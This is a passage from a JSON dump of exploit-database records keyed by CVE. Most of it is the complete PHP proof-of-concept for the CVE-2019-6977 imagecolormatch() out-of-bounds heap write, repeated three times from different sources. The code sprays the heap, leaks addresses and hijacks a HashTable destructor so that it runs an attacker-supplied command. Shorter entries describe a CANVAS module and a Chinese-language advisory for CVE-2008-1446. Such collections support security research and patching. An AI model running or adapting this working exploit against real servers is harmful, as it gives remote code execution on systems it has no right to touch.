$z_address)\r\n{\r\n\tprint(\"\\nExploit SUCCESSFUL !\\n\");\r\n}\r\nelse\r\n{\r\n\tprint('NEW Nenuphar.ce: 0x' . dechex($new_ce1_address) . \"\\n\");\r\n\tprint('NEW Nenuphar.std.properties: 0x' . dechex($new_props_address) . \"\\n\");\r\n\tprint(\"\\nExploit FAILED !\\n\");\r\n}\n\n#  0day.today [2019-04-11]  #",
            "cvss": {
                "score": 6.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/zdt/1337DAY-ID-32508"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2019-04-09T00:00:00",
            "published": "2019-04-09T00:00:00",
            "id": "PACKETSTORM:152459",
            "href": "https://packetstormsecurity.com/files/152459/PHP-7.2-imagecolormatch-Out-Of-Band-Heap-Write.html",
            "title": "PHP 7.2 imagecolormatch() Out-Of-Band Heap Write",
            "type": "packetstorm",
            "sourceData": "`<?php  \n# imagecolormatch() OOB Heap Write exploit  \n# https://bugs.php.net/bug.php?id=77270  \n# CVE-2019-6977  \n# Charles Fol  \n# @cfreal_  \n#  \n# Usage: GET/POST /exploit.php?f=<system_addr>&c=<command>  \n# Example: GET/POST /exploit.php?f=0x7fe83d1bb480&c=id+>+/dev/shm/titi  \n#  \n# Target: PHP 7.2.x  \n# Tested on: PHP 7.2.12  \n#  \n  \n/*  \n  \nbuf = (unsigned long *)safe_emalloc(sizeof(unsigned long), 5 * im2->colorsTotal, 0);  \n  \nfor (x=0; x<im1->sx; x++) {  \nfor( y=0; y<im1->sy; y++ ) {  \ncolor = im2->pixels[y][x];  \nrgb = im1->tpixels[y][x];  \nbp = buf + (color * 5);  \n(*(bp++))++;  \n*(bp++) += gdTrueColorGetRed(rgb);  \n*(bp++) += gdTrueColorGetGreen(rgb);  \n*(bp++) += gdTrueColorGetBlue(rgb);  \n*(bp++) += gdTrueColorGetAlpha(rgb);  \n}  \n  \nThe buffer is written to by means of a color being the index:  \ncolor = im2->pixels[y][x];  \n..  \nbp = buf + (color * 5);  \n  \n*/  \n  \n#  \n# The bug allows us to increment 5 longs located after buf in memory.  \n# The first long is incremented by one, others by an arbitrary value between 0  \n# and 0xff.  \n#  \n  \nerror_reporting(E_ALL);  \ndefine('OFFSET_STR_VAL', 0x18);  \ndefine('BYTES_PER_COLOR', 0x28);  \n  \n  \nclass Nenuphar extends DOMNode  \n{  \n# Add a property so that std.properties is created  \nfunction __construct()  \n{  \n$this->x = '1';  \n}  \n  \n# Define __get  \n# => ce->ce_flags & ZEND_ACC_USE_GUARDS == ZEND_ACC_USE_GUARDS  \n# => zend_object_properties_size() == 0  \n# => sizeof(intern) == 0x50  \nfunction __get($x)  \n{  \nreturn $this->$x;  \n}  \n}  \n  \nclass Nenuphar2 extends DOMNode  \n{  \nfunction __construct()  \n{  \n$this->x = '2';  \n}  \n  \nfunction __get($x)  \n{  \nreturn $this->$x;  \n}  \n}  \n  \nfunction ptr2str($ptr, $m=8)  \n{  \n$out = \"\";  \nfor ($i=0; $i<$m; $i++)  \n{  \n$out .= chr($ptr & 0xff);  \n$ptr >>= 8;  \n}  \nreturn $out;  \n}  \n  \nfunction str2ptr(&$str, $p, $s=8)  \n{  \n$address = 0;  \nfor($j=$p+$s-1;$j>=$p;$j--)  \n{  \n$address <<= 8;  \n$address |= ord($str[$j]);  \n}  \nreturn $address;  \n}  \n  \n# Spray stuff so that we get concurrent memory blocks  \nfor($i=0;$i<100;$i++)  \n${'spray'.$i} = str_repeat(chr($i), 2 * BYTES_PER_COLOR - OFFSET_STR_VAL);  \nfor($i=0;$i<100;$i++)  \n${'sprayx'.$i} = str_repeat(chr($i), 12 * BYTES_PER_COLOR - OFFSET_STR_VAL);  \n  \n#  \n# #1: Address leak  \n# We want to obtain the address of a string so that we can make  \n# the Nenuphar.std.properties HashTable* point to it and hence control its  \n# structure.  \n#  \n  \n# We create two images $img1 and $img2, both of 1 pixel.  \n# The RGB bytes of the pixel of $img1 will be added to OOB memory because we set  \n# $img2 to have $nb_colors images and we set its only pixel to color number  \n# $nb_colors.  \n#  \n$nb_colors = 12;  \n$size_buf = $nb_colors * BYTES_PER_COLOR;  \n  \n# One pixel image so that the double loop iterates only once  \n$img1 = imagecreatetruecolor(1, 1);  \n  \n# The three RGB values will be added to OOB memory  \n# First value (Red) is added to the size of the zend_string structure which  \n# lays under buf in memory.  \n$color = imagecolorallocate($img1, 0xFF, 0, 0);  \nimagefill($img1, 0, 0, $color);  \n  \n$img2 = imagecreate(1, 1);  \n  \n# Allocate $nb_colors colors: |buf| = $nb_colors * BYTES_PER_COLOR = 0x1e0  \n# which puts buf in 0x200 memory blocks  \nfor($i=0;$i<$nb_colors;$i++)  \nimagecolorallocate($img2, 0, 0, $i);  \n  \nimagesetpixel($img2, 0, 0, $nb_colors + 1);  \n  \n# Create a memory layout as such:  \n# [z: zend_string: 0x200]  \n# [x: zend_string: 0x200]  \n# [y: zend_string: 0x200]  \n$z = str_repeat('Z', $size_buf - OFFSET_STR_VAL);  \n$x = str_repeat('X', $size_buf - OFFSET_STR_VAL);  \n$y = str_repeat('Y', $size_buf - OFFSET_STR_VAL);  \n  \n# Then, we unset z and call imagecolormatch(); buf will be at z's memory  \n# location during the execution  \n# [buf: long[] : 0x200]  \n# [x: zend_string: 0x200]  \n# [y: zend_string: 0x200]  \n#  \n# We can write buf + 0x208 + (0x08 or 0x10 or 0x18)  \n# buf + 0x208 + 0x08 is X's zend_string.len  \nunset($z);  \nimagecolormatch($img1, $img2);  \n  \n# Now, $x's size has been increased by 0xFF, so we can read further in memory.  \n#  \n# Since buf was the last freed block, by unsetting y, we make its first 8 bytes  \n# point to the old memory location of buf  \n# [free: 0x200] <-+  \n# [x: zend_string: 0x200] |  \n# [free: 0x200] --+  \nunset($y);  \n# We can read those bytes because x's size has been increased  \n$z_address = str2ptr($x, 488) + OFFSET_STR_VAL;  \n  \n# Reset both these variables so that their slot cannot be \"stolen\" by other  \n# allocations  \n$y = str_repeat('Y', $size_buf - OFFSET_STR_VAL - 8);  \n  \n# Now that we have z's address, we can make something point to it.  \n# We create a fake HashTable structure in Z; when the script exits, each element  \n# of this HashTable will be destroyed by calling ht->pDestructor(element)  \n# The only element here is a string: \"id\"  \n$z =   \n# refcount  \nptr2str(1) .  \n# u-nTableMask meth  \nptr2str(0) .  \n# Bucket arData  \nptr2str($z_address + 0x38) .  \n# uint32_t nNumUsed;  \nptr2str(1, 4) .  \n# uint32_t nNumOfElements;  \nptr2str(1, 4) .  \n# uint32_t nTableSize  \nptr2str(0, 4) .  \n# uint32_t nInternalPointer  \nptr2str(0, 4) .  \n# zend_long nNextFreeElement  \nptr2str(0x4242424242424242) .  \n# dtor_func_t pDestructor  \nptr2str(hexdec($_REQUEST['f'])) .  \nstr_pad($_REQUEST['c'], 0x100, \"\\x00\") .  \nptr2str(0, strlen($y) - 0x38 - 0x100);  \n;  \n  \n# At this point we control a string $z and we know its address: we'll make an  \n# internal PHP HashTable structure point to it.  \n  \n  \n#  \n# #2: Read Nenuphar.std.properties  \n#  \n  \n# The tricky part here was to find an interesting PHP structure that is  \n# allocated in the same fastbins as buf, so that we can modify one of its  \n# internal pointers. Since buf has to be a multiple of 0x28, I used dom_object,  \n# whose size is 0x50 = 0x28 * 2. Nenuphar is a subclass of dom_object with just  \n# one extra method, __get().  \n# php_dom.c:1074: dom_object *intern = ecalloc(1, sizeof(dom_object) + zend_object_properties_size(class_type));  \n# Since we defined a __get() method, zend_object_properties_size(class_type) = 0  \n# and not -0x10.  \n#  \n# zend_object.properties points to an HashTable. Controlling an HashTable in PHP  \n# means code execution since at the end of the script, every element of an HT is  \n# destroyed by calling ht.pDestructor(ht.arData[i]).  \n# Hence, we want to change the $nenuphar.std.properties pointer.  \n#  \n# To proceed, we first read $nenuphar.std.properties, and then increment it  \n# by triggering the bug several times, until  \n# $nenuphar.std.properties == $z_address  \n#  \n# Sadly, $nenuphar.std.ce will also get incremented by one every time we trigger  \n# the bug. This is due to (*(bp++))++ (in gdImageColorMatch).  \n# To circumvent this problem, we create two classes, Nenuphar and Nenuphar2, and  \n# instanciate them as $nenuphar and $nenuphar2. After we're done changing the  \n# std.properties pointer, we trigger the bug more times, until  \n# $nenuphar.std.ce == $nenuphar2.std.ce2  \n#  \n# This way, $nenuphar will have an arbitrary std.properties pointer, and its  \n# std.ce will be valid.  \n#  \n# Afterwards, we let the script exit, which will destroy our fake hashtable (Z),  \n# and therefore call our arbitrary function.  \n#  \n  \n# Here we want fastbins of size 0x50 to match dom_object's size  \n$nb_colors = 2;  \n$size_buf = $nb_colors * BYTES_PER_COLOR;  \n  \n$img1 = imagecreatetruecolor(1, 1);  \n# The three RGB values will be added to OOB memory  \n# Second value (Green) is added to the size of the zend_string structure which  \n# lays under buf in memory.  \n$color = imagecolorallocate($img1, 0, 0xFF, 0);  \nimagefill($img1, 0, 0, $color);  \n  \n# Allocate 2 colors so that |buf| = 2 * 0x28 = 0x50  \n$img2 = imagecreate(1, 1);  \nfor($i=0;$i<$nb_colors;$i++)  \nimagecolorallocate($img2, 0, 0, $i);  \n  \n$y = str_repeat('Y', $size_buf - OFFSET_STR_VAL - 8);  \n$x = str_repeat('X', $size_buf - OFFSET_STR_VAL - 8);  \n$nenuphar = new Nenuphar();  \n$nenuphar2 = new Nenuphar2();  \n  \nimagesetpixel($img2, 0, 0, $nb_colors);  \n  \n# Unsetting the first string so that buf takes its place  \nunset($y);  \n  \n# Trigger the bug: $x's size is increased by 0xFF  \nimagecolormatch($img1, $img2);  \n  \n$ce1_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + 0x28);  \n$ce2_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + $size_buf + 0x28);  \n$props_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + 0x38);  \n  \nprint('Nenuphar.ce: 0x' . dechex($ce1_address) . \"\\n\");  \nprint('Nenuphar2.ce: 0x' . dechex($ce2_address) . \"\\n\");  \nprint('Nenuphar.properties: 0x' . dechex($props_address) . \"\\n\");  \nprint('z.val: 0x' . dechex($z_address) . \"\\n\");  \nprint('Difference: 0x' . dechex($z_address-$props_address) . \"\\n\");  \n  \nif(  \n$ce2_address - $ce1_address < ($z_address-$props_address) / 0xff ||  \n$z_address - $props_address < 0  \n)  \n{  \nprint('That won\\'t work');  \nexit(0);  \n}  \n  \n  \n#  \n# #3: Modifying Nenuphar.std.properties and Nenuphar.std.ce  \n#  \n  \n# Each time we increment Nenuphar.properties by an arbitrary value, ce1_address  \n# is also incremented by one because of (*(bp++))++;  \n# Therefore after we're done incrementing props_address to z_address we need  \n# to increment ce1's address one by one until Nenuphar1.ce == Nenuphar2.ce  \n  \n# The memory structure we have ATM is OK. We can just trigger the bug again  \n# until Nenuphar.properties == z_address  \n  \n$color = imagecolorallocate($img1, 0, 0xFF, 0);  \nimagefill($img1, 0, 0, $color);  \nimagesetpixel($img2, 0, 0, $nb_colors + 3);  \n  \nfor($current=$props_address+0xFF;$current<=$z_address;$current+=0xFF)  \n{  \nimagecolormatch($img1, $img2);  \n$ce1_address++;  \n}  \n  \n$color = imagecolorallocate($img1, 0, $z_address-$current+0xff, 0);  \nimagefill($img1, 0, 0, $color);  \n$current = imagecolormatch($img1, $img2);  \n$ce1_address++;  \n  \n# Since we don't want to touch other values, only increase the first one, we set  \n# the three colors to 0  \n$color = imagecolorallocate($img1, 0, 0, 0);  \nimagefill($img1, 0, 0, $color);  \n  \n# Trigger the bug once to increment ce1 by one.  \nwhile($ce1_address++ < $ce2_address)  \n{  \nimagecolormatch($img1, $img2);  \n}  \n  \n# Read the string again to see if we were successful  \n  \n$new_ce1_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + 0x28);  \n$new_props_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + 0x38);  \n  \nif($new_ce1_address == $ce2_address && $new_props_address == $z_address)  \n{  \nprint(\"\\nExploit SUCCESSFUL !\\n\");  \n}  \nelse  \n{  \nprint('NEW Nenuphar.ce: 0x' . dechex($new_ce1_address) . \"\\n\");  \nprint('NEW Nenuphar.std.properties: 0x' . dechex($new_props_address) . \"\\n\");  \nprint(\"\\nExploit FAILED !\\n\");  \n}  \n`\n",
            "cvss": {
                "score": 6.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/packetstorm/PACKETSTORM:152459"
        },
        {
            "bulletinFamily": "exploit",
            "description": "",
            "modified": "2019-02-27T00:00:00",
            "published": "2019-02-27T00:00:00",
            "id": "EDB-ID:46677",
            "href": "https://www.exploit-db.com/exploits/46677",
            "type": "exploitdb",
            "title": "PHP 7.2 - &#039;imagecolormatch()&#039; Out of Band Heap Write",
            "sourceData": "<?php\r\n# imagecolormatch() OOB Heap Write exploit\r\n# https://bugs.php.net/bug.php?id=77270\r\n# CVE-2019-6977\r\n# Charles Fol\r\n# @cfreal_\r\n#\r\n# Usage: GET/POST /exploit.php?f=<system_addr>&c=<command>\r\n# Example: GET/POST /exploit.php?f=0x7fe83d1bb480&c=id+>+/dev/shm/titi\r\n#\r\n# Target: PHP 7.2.x\r\n# Tested on: PHP 7.2.12\r\n#\r\n\r\n/*\r\n\r\nbuf = (unsigned long *)safe_emalloc(sizeof(unsigned long), 5 * im2->colorsTotal, 0);\r\n\r\n\tfor (x=0; x<im1->sx; x++) {\r\n\t\tfor( y=0; y<im1->sy; y++ ) {\r\n\t\t\tcolor = im2->pixels[y][x];\r\n\t\t\trgb = im1->tpixels[y][x];\r\n\t\t\tbp = buf + (color * 5);\r\n\t\t\t(*(bp++))++;\r\n\t\t\t*(bp++) += gdTrueColorGetRed(rgb);\r\n\t\t\t*(bp++) += gdTrueColorGetGreen(rgb);\r\n\t\t\t*(bp++) += gdTrueColorGetBlue(rgb);\r\n\t\t\t*(bp++) += gdTrueColorGetAlpha(rgb);\r\n\t\t}\r\n\r\nThe buffer is written to by means of a color being the index:\r\ncolor = im2->pixels[y][x];\r\n..\r\nbp = buf + (color * 5);\r\n\r\n*/\r\n\r\n#\r\n# The bug allows us to increment 5 longs located after buf in memory.\r\n# The first long is incremented by one, others by an arbitrary value between 0\r\n# and 0xff.\r\n#\r\n\r\nerror_reporting(E_ALL);\r\ndefine('OFFSET_STR_VAL', 0x18);\r\ndefine('BYTES_PER_COLOR', 0x28);\r\n\r\n\r\nclass Nenuphar extends DOMNode\r\n{\r\n\t# Add a property so that std.properties is created\r\n\tfunction __construct()\r\n\t{\r\n\t\t$this->x = '1';\r\n\t}\r\n\r\n\t# Define __get\r\n\t# => ce->ce_flags & ZEND_ACC_USE_GUARDS == ZEND_ACC_USE_GUARDS\r\n\t# => zend_object_properties_size() == 0\r\n\t# => sizeof(intern) == 0x50\r\n\tfunction __get($x)\r\n\t{\r\n\t\treturn $this->$x;\r\n\t}\r\n}\r\n\r\nclass Nenuphar2 extends DOMNode\r\n{\r\n\tfunction __construct()\r\n\t{\r\n\t\t$this->x = '2';\r\n\t}\r\n\r\n\tfunction __get($x)\r\n\t{\r\n\t\treturn $this->$x;\r\n\t}\r\n}\r\n\r\nfunction ptr2str($ptr, $m=8)\r\n{\r\n\t$out = \"\";\r\n    for ($i=0; $i<$m; $i++)\r\n    {\r\n        $out .= chr($ptr & 0xff);\r\n        $ptr >>= 8;\r\n    }\r\n    return $out;\r\n}\r\n\r\nfunction str2ptr(&$str, $p, $s=8)\r\n{\r\n\t$address = 0;\r\n\tfor($j=$p+$s-1;$j>=$p;$j--)\r\n\t{\r\n\t\t$address <<= 8;\r\n\t\t$address |= ord($str[$j]);\r\n\t}\r\n\treturn $address;\r\n}\r\n\r\n# Spray stuff so that we get concurrent memory blocks\r\nfor($i=0;$i<100;$i++)\r\n\t${'spray'.$i} = str_repeat(chr($i), 2 * BYTES_PER_COLOR - OFFSET_STR_VAL);\r\nfor($i=0;$i<100;$i++)\r\n\t${'sprayx'.$i} = str_repeat(chr($i), 12 * BYTES_PER_COLOR - OFFSET_STR_VAL);\r\n\r\n#\r\n# #1: Address leak\r\n# We want to obtain the address of a string so that we can make\r\n# the Nenuphar.std.properties HashTable* point to it and hence control its\r\n# structure.\r\n#\r\n\r\n# We create two images $img1 and $img2, both of 1 pixel.\r\n# The RGB bytes of the pixel of $img1 will be added to OOB memory because we set\r\n# $img2 to have $nb_colors images and we set its only pixel to color number\r\n# $nb_colors.\r\n#\r\n$nb_colors = 12;\r\n$size_buf = $nb_colors * BYTES_PER_COLOR;\r\n\r\n# One pixel image so that the double loop iterates only once\r\n$img1 = imagecreatetruecolor(1, 1);\r\n\r\n# The three RGB values will be added to OOB memory\r\n# First value (Red) is added to the size of the zend_string structure which\r\n# lays under buf in memory.\r\n$color = imagecolorallocate($img1, 0xFF, 0, 0);\r\nimagefill($img1, 0, 0, $color);\r\n\r\n$img2 = imagecreate(1, 1);\r\n\r\n# Allocate $nb_colors colors: |buf| = $nb_colors * BYTES_PER_COLOR = 0x1e0\r\n# which puts buf in 0x200 memory blocks\r\nfor($i=0;$i<$nb_colors;$i++)\r\n\timagecolorallocate($img2, 0, 0, $i);\r\n\r\nimagesetpixel($img2, 0, 0, $nb_colors + 1);\r\n\r\n# Create a memory layout as such:\r\n# [z:   zend_string: 0x200]\r\n# [x:   zend_string: 0x200]\r\n# [y:   zend_string: 0x200]\r\n$z = str_repeat('Z', $size_buf - OFFSET_STR_VAL);\r\n$x = str_repeat('X', $size_buf - OFFSET_STR_VAL);\r\n$y = str_repeat('Y', $size_buf - OFFSET_STR_VAL);\r\n\r\n# Then, we unset z and call imagecolormatch(); buf will be at z's memory\r\n# location during the execution\r\n# [buf: long[]     : 0x200]\r\n# [x:   zend_string: 0x200]\r\n# [y:   zend_string: 0x200]\r\n#\r\n# We can write buf + 0x208 + (0x08 or 0x10 or 0x18)\r\n# buf + 0x208 + 0x08 is X's zend_string.len\r\nunset($z);\r\nimagecolormatch($img1, $img2);\r\n\r\n# Now, $x's size has been increased by 0xFF, so we can read further in memory.\r\n#\r\n# Since buf was the last freed block, by unsetting y, we make its first 8 bytes\r\n# point to the old memory location of buf\r\n# [free:             0x200] <-+\r\n# [x:   zend_string: 0x200]   |\r\n# [free:             0x200] --+\r\nunset($y);\r\n# We can read those bytes because x's size has been increased\r\n$z_address = str2ptr($x, 488) + OFFSET_STR_VAL;\r\n\r\n# Reset both these variables so that their slot cannot be \"stolen\" by other\r\n# allocations\r\n$y = str_repeat('Y', $size_buf - OFFSET_STR_VAL - 8);\r\n\r\n# Now that we have z's address, we can make something point to it.\r\n# We create a fake HashTable structure in Z; when the script exits, each element\r\n# of this HashTable will be destroyed by calling ht->pDestructor(element)\r\n# The only element here is a string: \"id\"\r\n$z = \r\n\t# refcount\r\n\tptr2str(1) .\r\n\t# u-nTableMask meth\r\n\tptr2str(0) .\r\n\t# Bucket arData\r\n\tptr2str($z_address + 0x38) .\r\n\t# uint32_t nNumUsed;\r\n\tptr2str(1, 4) .\r\n    # uint32_t nNumOfElements;\r\n\tptr2str(1, 4) .\r\n\t# uint32_t nTableSize\r\n\tptr2str(0, 4) .\r\n\t# uint32_t nInternalPointer\r\n\tptr2str(0, 4) .\r\n\t# zend_long nNextFreeElement\r\n\tptr2str(0x4242424242424242) .\r\n\t# dtor_func_t pDestructor\r\n\tptr2str(hexdec($_REQUEST['f'])) .\r\n\tstr_pad($_REQUEST['c'], 0x100, \"\\x00\") .\r\n\tptr2str(0, strlen($y) - 0x38 - 0x100);\r\n;\r\n\r\n# At this point we control a string $z and we know its address: we'll make an\r\n# internal PHP HashTable structure point to it.\r\n\r\n\r\n#\r\n# #2: Read Nenuphar.std.properties\r\n#\r\n\r\n# The tricky part here was to find an interesting PHP structure that is\r\n# allocated in the same fastbins as buf, so that we can modify one of its\r\n# internal pointers. Since buf has to be a multiple of 0x28, I used dom_object,\r\n# whose size is 0x50 = 0x28 * 2. Nenuphar is a subclass of dom_object with just\r\n# one extra method, __get().\r\n# php_dom.c:1074: dom_object *intern = ecalloc(1, sizeof(dom_object) + zend_object_properties_size(class_type));\r\n# Since we defined a __get() method, zend_object_properties_size(class_type) = 0\r\n# and not -0x10.\r\n#\r\n# zend_object.properties points to an HashTable. Controlling an HashTable in PHP\r\n# means code execution since at the end of the script, every element of an HT is\r\n# destroyed by calling ht.pDestructor(ht.arData[i]).\r\n# Hence, we want to change the $nenuphar.std.properties pointer.\r\n#\r\n# To proceed, we first read $nenuphar.std.properties, and then increment it\r\n# by triggering the bug several times, until\r\n# $nenuphar.std.properties == $z_address\r\n#\r\n# Sadly, $nenuphar.std.ce will also get incremented by one every time we trigger\r\n# the bug. This is due to (*(bp++))++ (in gdImageColorMatch).\r\n# To circumvent this problem, we create two classes, Nenuphar and Nenuphar2, and\r\n# instanciate them as $nenuphar and $nenuphar2. After we're done changing the\r\n# std.properties pointer, we trigger the bug more times, until\r\n# $nenuphar.std.ce == $nenuphar2.std.ce2\r\n#\r\n# This way, $nenuphar will have an arbitrary std.properties pointer, and its\r\n# std.ce will be valid.\r\n#\r\n# Afterwards, we let the script exit, which will destroy our fake hashtable (Z),\r\n# and therefore call our arbitrary function.\r\n#\r\n\r\n# Here we want fastbins of size 0x50 to match dom_object's size\r\n$nb_colors = 2;\r\n$size_buf = $nb_colors * BYTES_PER_COLOR;\r\n\r\n$img1 = imagecreatetruecolor(1, 1);\r\n# The three RGB values will be added to OOB memory\r\n# Second value (Green) is added to the size of the zend_string structure which\r\n# lays under buf in memory.\r\n$color = imagecolorallocate($img1, 0, 0xFF, 0);\r\nimagefill($img1, 0, 0, $color);\r\n\r\n# Allocate 2 colors so that |buf| = 2 * 0x28 = 0x50\r\n$img2 = imagecreate(1, 1);\r\nfor($i=0;$i<$nb_colors;$i++)\r\n\timagecolorallocate($img2, 0, 0, $i);\r\n\r\n$y = str_repeat('Y', $size_buf - OFFSET_STR_VAL - 8);\r\n$x = str_repeat('X', $size_buf - OFFSET_STR_VAL - 8);\r\n$nenuphar = new Nenuphar();\r\n$nenuphar2 = new Nenuphar2();\r\n\r\nimagesetpixel($img2, 0, 0, $nb_colors);\r\n\r\n# Unsetting the first string so that buf takes its place\r\nunset($y);\r\n\r\n# Trigger the bug: $x's size is increased by 0xFF\r\nimagecolormatch($img1, $img2);\r\n\r\n$ce1_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + 0x28);\r\n$ce2_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + $size_buf + 0x28);\r\n$props_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + 0x38);\r\n\r\nprint('Nenuphar.ce: 0x' . dechex($ce1_address) . \"\\n\");\r\nprint('Nenuphar2.ce: 0x' . dechex($ce2_address) . \"\\n\");\r\nprint('Nenuphar.properties: 0x' . dechex($props_address) . \"\\n\");\r\nprint('z.val: 0x' . dechex($z_address) . \"\\n\");\r\nprint('Difference: 0x' . dechex($z_address-$props_address) . \"\\n\");\r\n\r\nif(\r\n\t$ce2_address - $ce1_address < ($z_address-$props_address) / 0xff ||\r\n\t$z_address - $props_address < 0\r\n)\r\n{\r\n\tprint('That won\\'t work');\r\n\texit(0);\r\n}\r\n\r\n\r\n#\r\n# #3: Modifying Nenuphar.std.properties and Nenuphar.std.ce\r\n#\r\n\r\n# Each time we increment Nenuphar.properties by an arbitrary value, ce1_address\r\n# is also incremented by one because of (*(bp++))++;\r\n# Therefore after we're done incrementing props_address to z_address we need\r\n# to increment ce1's address one by one until Nenuphar1.ce == Nenuphar2.ce\r\n\r\n# The memory structure we have ATM is OK. We can just trigger the bug again\r\n# until Nenuphar.properties == z_address\r\n\r\n$color = imagecolorallocate($img1, 0, 0xFF, 0);\r\nimagefill($img1, 0, 0, $color);\r\nimagesetpixel($img2, 0, 0, $nb_colors + 3);\r\n\r\nfor($current=$props_address+0xFF;$current<=$z_address;$current+=0xFF)\r\n{\r\n\timagecolormatch($img1, $img2);\r\n\t$ce1_address++;\r\n}\r\n\r\n$color = imagecolorallocate($img1, 0, $z_address-$current+0xff, 0);\r\nimagefill($img1, 0, 0, $color);\r\n$current = imagecolormatch($img1, $img2);\r\n$ce1_address++;\r\n\r\n# Since we don't want to touch other values, only increase the first one, we set\r\n# the three colors to 0\r\n$color = imagecolorallocate($img1, 0, 0, 0);\r\nimagefill($img1, 0, 0, $color);\r\n\r\n# Trigger the bug once to increment ce1 by one.\r\nwhile($ce1_address++ < $ce2_address)\r\n{\r\n\timagecolormatch($img1, $img2);\r\n}\r\n\r\n# Read the string again to see if we were successful\r\n\r\n$new_ce1_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + 0x28);\r\n$new_props_address = str2ptr($x, $size_buf - OFFSET_STR_VAL + 0x38);\r\n\r\nif($new_ce1_address == $ce2_address && $new_props_address == $z_address)\r\n{\r\n\tprint(\"\\nExploit SUCCESSFUL !\\n\");\r\n}\r\nelse\r\n{\r\n\tprint('NEW Nenuphar.ce: 0x' . dechex($new_ce1_address) . \"\\n\");\r\n\tprint('NEW Nenuphar.std.properties: 0x' . dechex($new_props_address) . \"\\n\");\r\n\tprint(\"\\nExploit FAILED !\\n\");\r\n}",
            "cvss": {
                "score": 6.8,
                "vector": "AV:NETWORK/AC:MEDIUM/Au:NONE/C:PARTIAL/I:PARTIAL/A:PARTIAL/"
            },
            "vhref": "https://vulners.com/exploitdb/EDB-ID:46677"
        }
    ],
    "CVE-2008-1446": [
        {
            "bulletinFamily": "exploit",
            "description": "**Name**|  ms08_062  \n---|---  \n**CVE**|  CVE-2008-1446  \n**Exploit Pack**|  [CANVAS](<http://http://www.immunityinc.com/products-canvas.shtml>)  \n**Description**| Windows Internet Printing Service Overflow  \n**Notes**| CVE Name: CVE-2008-1446  \nVENDOR: Microsoft  \nNotes: This exploit will try and listen for connection on port 445/TCP. Thus it needs to be run as root under Linux, or as Administrator under Windows if SMB was disabled on all interfaces. Most of the time, /Printers/ requires credentials to access. If not, enter no login/password. If it does, we only support Basic Authentication at the moment.  \nVersionsAffected:   \nRepeatability: Infinite  \nMSADV: MS08-062  \nReferences: http://www.microsoft.com/technet/security/Bulletin/MS08-062.mspx  \nCVE Url: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-1446  \nDate public: 10/14/08  \nCVSS: 9.0  \n\n",
            "modified": "2008-10-15T00:12:00",
            "published": "2008-10-15T00:12:00",
            "id": "MS08_062",
            "href": "http://exploitlist.immunityinc.com/home/exploitpack/CANVAS/ms08_062",
            "type": "canvas",
            "title": "Immunity Canvas: MS08_062",
            "cvss": {
                "score": 9.0,
                "vector": "AV:N/AC:L/Au:S/C:C/I:C/A:C"
            },
            "vhref": "https://vulners.com/canvas/MS08_062"
        },
        {
            "bulletinFamily": "exploit",
            "description": "BUGTRAQ  ID: 31682\r\nCVE(CAN) ID: CVE-2008-1446\r\n\r\nMicrosoft Windows\u662f\u5fae\u8f6f\u53d1\u5e03\u7684\u975e\u5e38\u6d41\u884c\u7684\u64cd\u4f5c\u7cfb\u7edf\u3002\r\n\r\nIIS\u7684Internet\u6253\u5370\u534f\u8baeISAPI\u6269\u5c55\u5728\u5904\u7406\u7279\u5236\u7684IPP\u54cd\u5e94\u65f6\u5b58\u5728\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\u3002\u5982\u679cWindows\u7cfb\u7edf\u4e0a\u5728\u8fd0\u884cIIS\u4e14\u542f\u7528\u4e86Internet\u6253\u5370\u670d\u52a1\u7684\u8bdd\uff0c\u8fdc\u7a0b\u653b\u51fb\u8005\u53ef\u4ee5\u901a\u8fc7\u7279\u5236\u7684HTTP POST\u8bf7\u6c42\u8bf1\u9a97\u53d7\u5f71\u54cd\u7684\u670d\u52a1\u5668\u8fde\u63a5\u5230\u6076\u610f\u7684IPP\u670d\u52a1\u5668\u6765\u89e6\u53d1\u8fd9\u4e2a\u6ea2\u51fa\uff0c\u5bfc\u81f4\u6267\u884c\u4efb\u610f\u6307\u4ee4\u3002\r\n\n\nMicrosoft Windows XP SP3\r\nMicrosoft Windows XP SP2\r\nMicrosoft Windows Vista SP1\r\nMicrosoft Windows Vista \r\nMicrosoft Windows Server 2008\r\nMicrosoft Windows Server 2003 SP2\r\nMicrosoft Windows Server 2003 SP1\r\nMicrosoft Windows 2000SP4\n \u4e34\u65f6\u89e3\u51b3\u65b9\u6cd5\uff1a\r\n\r\n* \u7981\u7528IPP\u670d\u52a1\u3002\r\n* \u8fd0\u884cIIS\u9501\u5b9a\u5de5\u51772.1\u3002\r\n\r\n\u5382\u5546\u8865\u4e01\uff1a\r\n\r\nMicrosoft\r\n---------\r\nMicrosoft\u5df2\u7ecf\u4e3a\u6b64\u53d1\u5e03\u4e86\u4e00\u4e2a\u5b89\u5168\u516c\u544a\uff08MS08-062\uff09\u4ee5\u53ca\u76f8\u5e94\u8865\u4e01:\r\nMS08-062\uff1aVulnerability in Windows Internet Printing Service Could Allow Remote Code Execution (953155)\r\n\u94fe\u63a5\uff1a<a href=http://www.microsoft.com/technet/security/Bulletin/MS08-062.mspx?pf=true target=_blank>http://www.microsoft.com/technet/security/Bulletin/MS08-062.mspx?pf=true</a>",
            "modified": "2008-10-15T00:00:00",
            "published": "2008-10-15T00:00:00",
            "href": "https://www.seebug.org/vuldb/ssvid-4241",
            "id": "SSV:4241",
            "type": "seebug",
            "title": "Microsoft Windows Internet\u6253\u5370\u670d\u52a1\u6574\u6570\u6ea2\u51fa\u6f0f\u6d1e\uff08MS08-062\uff09",
            "sourceData": "",
            "cvss": {
                "score": 9.0,
